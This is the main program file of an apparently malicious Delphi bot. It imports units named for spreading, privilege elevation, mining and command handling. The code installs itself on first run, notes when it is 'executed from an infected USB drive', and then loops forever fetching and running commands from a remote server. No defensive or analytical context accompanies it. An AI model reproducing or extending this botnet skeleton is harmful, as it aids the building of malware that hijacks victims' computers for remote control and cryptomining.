program Bot;

{$IFDEF DEBUG}
  {$APPTYPE CONSOLE}
{$ENDIF}
{$R *.res}


uses
  System.SysUtils,
  Classes,
  NetUnit in 'Units\NetUnit.pas' {Net: TDataModule},
  BotUnit in 'Units\BotUnit.pas',
  Basics in 'Units\Basics.pas',
  DPipes in 'Units\DProcess\DPipes.pas',
  DProcess in 'Units\DProcess\DProcess.pas',
  SystemUnit in 'Units\SystemUnit.pas',
  ElevateUnit in 'Units\ElevateUnit.pas',
  CommandUnit in 'Units\CommandUnit.pas',
  SpreadUnit in 'Units\SpreadUnit.pas',
  InfoUnit in 'Units\InfoUnit.pas',
  FileUnit in 'Units\FileUnit.pas',
  MineUnit in 'Units\MineUnit.pas';

procedure ParamActions;
Begin
  if ParamStr(0).Contains(CloneNames[0]) then
  Begin
    Open(ExtractFilePath(ParamStr(0)));
    Dbg('Executed from an infected USB drive.');
    Dbg('Opening: ' + ExtractFilePath(ParamStr(0)));
  End
  else if ParamStr(1) = '/wait' then
  Begin
    Sleep(1000);
    Dbg('Sleeping for 1 second...');
  End;
  if ParamStr(2) = '/delete' then
  Begin
    System.SysUtils.DeleteFile(ParamStr(3));
    Dbg('Deleting: ' + ParamStr(3));
  End;
End;

begin
{$IFDEF DEBUG}
  ReportMemoryLeaksOnShutdown := True;
{$ENDIF}
  Randomize;
  SetCurrentDir(ExtractFileDir(ParamStr(0)));
  ParamActions;
  CheckInstance;
  try
    if IsFirstStart then
    Begin
      Install;
      Exit;
    end
    else
      LoadSettings;
    Workers := TWorkerList.Create(True);
    Net := TNet.Create(Nil);
    Dbg('Listening for commands.');
    Repeat
      CheckSynchronize;
      Net.GetCommands;
      Net.ParseCommands;
      CommandUnit.CleanUp;
      Sleep(5000);
    Until False;
    Net.Free;
    Workers.Free;
  except
    on E: Exception do
      Dbg('Fatal ' + E.ClassName + ': ' + E.Message, dError);
  end;
  Readln;

end.
